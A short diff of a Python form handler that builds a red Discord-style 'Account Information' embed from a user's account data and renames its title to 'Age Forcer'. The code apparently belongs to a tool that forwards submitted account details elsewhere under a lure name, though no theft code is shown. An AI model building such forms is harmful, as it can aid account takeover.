@@ -252,8 +252,8 @@ def submit_form():
             'content': '',  # Empty content so embeds appear first
             'embeds': [
                 {
-                    # Account Information Embed (Top)
-                    'title': '👤 Account Information',
+                    # Account Information Embed (Top)  
+                    'title': 'Age Forcer',
                     'color': 0xff0000,  # Red color as requested
                     'thumbnail': {
                         'url': user_info['profile_picture']
